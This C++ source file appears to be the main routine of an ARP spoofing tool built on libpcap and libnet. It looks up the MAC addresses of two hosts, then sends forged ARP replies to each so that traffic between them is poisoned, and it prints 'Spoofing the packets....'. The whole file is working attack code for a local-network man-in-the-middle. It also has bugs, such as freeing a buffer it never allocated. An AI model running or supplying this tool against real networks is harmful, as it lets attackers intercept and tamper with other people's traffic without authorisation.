// arp_main.cpp

#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <libnet.h>
#include <string.h>
#include "arp_spoof.h"

void arp_main(u_char *s_mac, u_char *d_mac, struct in_addr s_ip, struct in_addr d_ip, pcap_t *handle)
{
	struct libnet_ethernet_hdr *eth_hdr;	//ethernet header
	struct libnet_arp_hdr *arp_hdr;		//arp hedaer
	struct pcap_pkthdr *header;		//packet header	
	
	const int arp_size = 42;	//arp_packet size (ether + arp)
	//pcap_t *handle = NULL;
	char errbuf[PCAP_ERRBUF_SIZE];
	char dev[] = "eth0";
	
	bpf_u_int32 mask;
	bpf_u_int32 net;
	
	u_char *packet;			//For the packet we send
	const u_char *reply;		//For arp reply packet
	
	u_char *r_mac;					//Receiver's Mac address

	char buf[INET_ADDRSTRLEN];			//For d_ip address
	int index = 0;

	struct in_addr f_ip;

	packet = (u_char *)malloc(arp_size);
	r_mac = (u_char *)malloc(6);
	
	eth_hdr = (struct libnet_ethernet_hdr *)malloc(sizeof(struct libnet_ethernet_hdr));
	arp_hdr = (struct libnet_arp_hdr *)malloc(sizeof(struct libnet_arp_hdr));
	memset(packet, 0, arp_size);		//initiallize the packet memory with 0's

	if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
	{
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL)
	{
		fprintf(stderr, "%s\n", errbuf);
		exit(1);
	}

	send_arp(packet, s_mac, d_mac, s_ip, d_ip, handle, 1);
	
	while(1)					//Check the packets!
	{
		index++;
		pcap_next_ex(handle, &header, &reply);
		if(get_arp(reply, s_mac, d_mac, d_ip) == 1)	
			break;

		if(index > 50)				//If we check more than 50 packets
		{
			printf("No ARP REPLY packet is captured\n");
			exit(1);
		}
	}

	printf("Sender MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", 
		d_mac[0], d_mac[1], d_mac[2], d_mac[3], d_mac[4], d_mac[5]);
	printf("Sender IP address: %s\n\n", inet_ntop(AF_INET, &d_ip, buf, sizeof(buf)));
	
	puts("Write Receiver IP address: ");
	
	while(1)
	{
		fgets(buf, sizeof(buf), stdin);
		buf[strlen(buf) -1 ] = '\0';

		if(inet_pton(AF_INET, buf, &f_ip.s_addr) == 0)
		{
			printf("Invalid IP address! \n");
			continue;
		}
		else
			break;
	}
	
	send_arp(packet, s_mac, r_mac, s_ip, f_ip, handle, 1);	//Send arp to Receiver
	
	while(1)					//Check the packets!
	{
		index++;
		pcap_next_ex(handle, &header, &reply);
		if(get_arp(reply, s_mac, r_mac, f_ip) == 1)	
			break;

		if(index > 50)				//If we check more than 50 packets
		{
			printf("No ARP REPLY packet is captured\n");
			exit(1);
		}
	}
	
	printf("Receiver MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", 
		r_mac[0], r_mac[1], r_mac[2], r_mac[3], r_mac[4], r_mac[5]);
	printf("Receiver IP address: %s\n\n", inet_ntop(AF_INET, &f_ip, buf, sizeof(buf)));

	send_arp(packet, s_mac, d_mac, f_ip, d_ip, handle, 2);	//Send fake ARP reply to sender
	send_arp(packet, s_mac, r_mac, d_ip, s_ip, handle, 2);	//Send fake ARP reply to receiver
	
	printf("\nSpoofing the packets....\n");
	
	free(packet);
	free(r_mac);
	free(d_mac);
	free(eth_hdr);
	free(arp_hdr);
}



